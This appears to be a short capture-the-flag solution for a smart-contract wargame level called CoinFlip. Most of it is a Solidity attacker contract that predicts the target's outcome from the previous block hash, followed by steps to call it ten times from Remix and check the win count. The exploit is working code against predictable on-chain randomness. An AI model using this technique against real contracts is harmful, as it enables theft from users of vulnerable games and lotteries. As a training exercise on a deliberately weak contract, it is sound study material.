# Contract code
```
pragma solidity ^0.4.24;

contract CoinFlip {
    function flip(bool _guess) public returns (bool);
}

contract CoinFlipper {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function flipCoin(address coinContract) public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip contractToCall = CoinFlip(coinContract);
        contractToCall.flip(side);
    }
}
```

Deploy the above on remix and use flipCoin function 10 times on Remix with the level instance address as an argument.

Use `contract.address` to get the level instance's address.

# How to view wins
`var wins = await contract.consecutiveWins()`

`wins.toNumber()`